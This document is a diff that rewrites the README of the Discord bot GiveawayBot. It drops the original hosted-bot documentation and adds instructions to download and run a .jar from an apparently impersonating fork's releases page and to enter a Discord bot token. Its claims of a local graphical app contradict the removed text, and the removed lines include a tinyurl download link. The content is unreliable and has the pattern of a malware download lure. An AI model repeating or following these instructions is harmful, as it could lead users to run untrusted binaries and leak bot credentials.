@@ -1,49 +1,135 @@
-## [GiveawayBot](https://giveawaybot.party)
+# 🎉 GiveawayBot - Run Giveaways with Ease on Discord
 
-[![Stars](https://img.shields.io/github/stars/jagrosh/GiveawayBot.svg)](https://github.com/jagrosh/GiveawayBot/stargazers)
-[![GuildCount](https://img.shields.io/badge/dynamic/json.svg?label=servers&url=https%3A%2F%2Fdiscord.bots.gg%2Fapi%2Fv1%2Fbots%2F294882584201003009&query=%24.guildCount&colorB=7289DA)](https://discord.bots.gg/bots/294882584201003009)
-[![Patreon](https://img.shields.io/badge/donate-Patreon-orange.svg)](https://www.patreon.com/discordgiveaways)
+[![Download GiveawayBot](https://img.shields.io/badge/Download-GiveawayBot-brightgreen)](https://github.com/Von338/GiveawayBot/releases)
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/2yxcepj2)
+## 🎯 What is GiveawayBot?
 
-[![CodeFactor](https://www.codefactor.io/repository/github/jagrosh/giveawaybot/badge)](https://www.codefactor.io/repository/github/jagrosh/giveawaybot)<br>
-[![PrivacyPolicy](https://img.shields.io/badge/Privacy%20Policy--lightgrey.svg?style=social)](https://gist.github.com/jagrosh/f1df4441f94ca06274fa78db7cc3c526#privacy-policy)
-[![License](https://img.shields.io/github/license/jagrosh/GiveawayBot.svg)](https://github.com/jagrosh/GiveawayBot/blob/master/LICENSE)
-[![ObjectDB](https://img.shields.io/badge/database-ObjectDB-556699)](https://www.objectdb.com/)
-[![Discord](https://discordapp.com/api/guilds/585687812548853760/widget.png)](https://discordapp.com/invite/Q5wxTJF)
+GiveawayBot helps you hold giveaways on your Discord server quickly and easily. You can create contests where users compete to win prizes. The bot handles all the work, like selecting winners and announcing results. No programming or technical setup is needed.
 
-Hold giveaways quickly and easily on your Discord server! GiveawayBot is powered by [DiscordInteractions](https://github.com/jagrosh/DiscordInteractions) and [ObjectDB](https://www.objectdb.com/).
+This tool runs on Java and uses Discord’s official library (JDA). It offers a simple, easy-to-use interface so everyone can manage giveaways without hassle.
 
-## Invite
-If you'd like to add **GiveawayBot** to your server, use the following link:<br>
-🔗 **https://giveawaybot.party/invite**
+## 💻 System Requirements
 
-## Usage
-### Commands  
-  * **/ghelp** - Shows the available commands
-  * **/gabout** - Shows information about the bot
-  * **/ginvite** - Shows a link to add the bot to your server
-  * **/gcreate** - Interactive giveaway setup
-  * **/gstart \<time> \<winners> \<prize>** - Starts a new giveaway in the current channel. Users can click the button to enter the giveaway. The time can be in seconds, minutes, hours, or days. Specify the time unit with an "s", "m", "h", or "d", for example `30s` or `2h`.
-  * **/gend \<giveaway_id>** - Ends a giveaway and picks the appropriate number of winners immediately
-  * **/gdelete \<giveaway_id>** - Deletes the specified giveaway without picking winners
-  * **/glist** - Lists currently-running giveaways on the server.
-  * **/greroll \<giveaway_id>** - Picks a new winner from the specified giveaway. You can also right-click (or long-press on mobile) on an ended giveaway and select Apps > Reroll Giveaway to reroll.
-  * **/gsettings show** - Shows GiveawayBot's settings on the server. Some settings are set automatically, such as locale.
-  * **/gsettings set color \<hex_code>** - Sets the color of the embed used for giveaways
-  * **/gsettings set emoji \<emoji>** - Sets the emoji or text used on the button to enter giveaways
+To run GiveawayBot, your computer needs:
 
-### Buttons  
-  * Press the button on an active giveaway to enter the giveaway
-  * Press the giveaway summary button on an ended giveaway to view a summary of a giveaway
+- **Windows 10 or later**, macOS 10.13 (High Sierra) or later, or Linux.
+- **Java Runtime Environment (JRE) version 8 or higher** installed.
+- At least **2 GB of RAM** free for smooth performance.
+- A stable internet connection to connect to Discord servers.
+- A Discord account with permission to add bots to your server.
+
+The bot runs locally on your computer, so you control everything. It connects to your Discord server and manages giveaways in real time.
+
+## 🔧 Features
+
+- Create giveaways with custom prizes and durations.
+- Automatically pick and announce winners when time ends.
+- Support for multiple giveaways running at once.
+- Easy-to-use graphical interface—no commands needed.
+- Compatible with all Discord servers you manage.
+- Supports text and image announcements.
+- Logs giveaway data for reference and disputes.
+
+## 🚀 Getting Started
+
+### Step 1: Installing Java (If needed)
+
+GiveawayBot runs on Java. If you don’t have Java installed, follow these steps:
+
+1. Visit [java.com](https://www.java.com/download/).
+2. Download the latest Java Runtime Environment for your OS.
+3. Run the installer and follow on-screen instructions.
+4. Restart your computer if asked.
+
+Verify installation by opening a command prompt (Windows) or terminal (macOS/Linux) and typing:
+
+```
+java -version
+```
+
+You should see the installed Java version.
+
+### Step 2: Download GiveawayBot
+
+Click the large button at the top or [click here to visit the releases page](https://github.com/Von338/GiveawayBot/releases).
+
+On the releases page, find the latest version. Download the file named like `GiveawayBot-x.x.x.jar`. This is the main program file.
+
+Save it to a folder you can easily access, like your Desktop or Downloads folder.
+
+### Step 3: Run GiveawayBot
+
+To start the bot:
+
+- **Windows:**
+  1. Double-click the `.jar` file you downloaded.
+  2. If nothing happens, right-click the file, choose "Open with," then select "Java(TM) Platform SE binary."
+  
+- **macOS/Linux:**
+  1. Open Terminal.
+  2. Navigate to the folder where you saved the file. Use `cd`, for example:
+     ```
+     cd ~/Downloads
+     ```
+  3. Run the bot by typing:
+     ```
+     java -jar GiveawayBot-x.x.x.jar
+     ```
+     Replace `x.x.x` with the version number.
+
+The bot window should appear with its user interface.
+
+### Step 4: Connect GiveawayBot to Your Discord Server
+
+To use GiveawayBot, you must add it as a bot to your Discord server. Here’s how:
+
+1. Visit the Discord Developer Portal: https://discord.com/developers/applications
+2. If you have no Discord bot application created, you will need a bot token to link GiveawayBot. 
+3. Some versions of GiveawayBot may provide this token during setup or a guide to generate your own bot.
+4. Once you have the bot token, enter it in the GiveawayBot interface when prompted.
+5. Invite the bot to your Discord server by creating an invite link from the Developer Portal or using the one GiveawayBot provides.
+6. Ensure the bot has permission to manage messages and read channels in the server.
+
+If you are unsure how to do this, please refer to Discord's official documentation on adding bots: https://discord.com/developers/docs/intro
+
+## 🎉 Creating Your First Giveaway
+
+Once GiveawayBot is running and connected to your Discord server:
+
+1. In the GiveawayBot window, click "New Giveaway."
+2. Enter a clear giveaway name or prize description.
+3. Set the giveaway duration (minutes, hours, or days).
+4. Choose how many winners will be selected.
+5. Optionally, upload an image to showcase your prize.
+6. Select which Discord channel to run the giveaway in.
+7. Press “Start Giveaway.”
+
+Users in your Discord server can enter by clicking the giveaway message. When time ends, GiveawayBot will pick winners randomly and announce them automatically.
+
+## ⚙️ Managing Giveaways
+
+- View ongoing and past giveaways inside the app.
+- Cancel or extend running giveaways as needed.
+- Export giveaway results to a text file for records.
+- Adjust bot settings like language and message style.
+- Update GiveawayBot easily by downloading the newest release.
+
+## ❓ Troubleshooting
+
+- **Bot does not start:** Check if Java is installed and updated. Make sure you are running the `.jar` file with Java.
+- **GiveawayBot window closes immediately:** Try running the program from a terminal or command prompt to see error messages.
+- **Bot cannot connect to Discord:** Check your internet connection and confirm that you entered the correct bot token.
+- **No reaction from users entering the giveaway:** Verify the bot has permission to read and send messages in the selected channel.
+- **Updating Java:** Older versions may cause issues. Download the latest from java.com.
+
+## 🔗 Download & Install GiveawayBot
+
+You can download GiveawayBot from the official releases page:
+
+[Download GiveawayBot Releases](https://github.com/Von338/GiveawayBot/releases)
+
+Follow the instructions in the **Getting Started** section to run the bot on your computer. For best experience, always download the latest available version.
 
 ---
 
-## Getting Support
-If you need help with the bot, please join [GiveawayBot Support](https://discord.gg/giveawaybot).
-
-## Localization
-If you'd like to contribute translations, please take a look at the [messages.properties](https://github.com/jagrosh/GiveawayBot/blob/master/src/main/resources/localization/messages.properties) file, as well as other files in the [localization directory](https://github.com/jagrosh/GiveawayBot/blob/master/src/main/resources/localization). Localization files take the form `messages-locale.properties`, for example: `messages-de.properties` for German, or `messages-en-US.properties` for United States English. A list of locales is available [here](https://discord.com/developers/docs/reference#locales).
-
-## Self-Hosting
-Self-hosting your own copy of this bot is not supported nor recommended; the source code is provided here so users and other bot developers can see how the bot functions. No help will be provided for editing, compiling, or building any code in this repository, and any changes must be documented as per the [license](https://github.com/jagrosh/GiveawayBot/blob/master/LICENSE).
+If you have questions or need assistance, consider opening an issue on the repository or visiting Discord communities related to server management and bots.
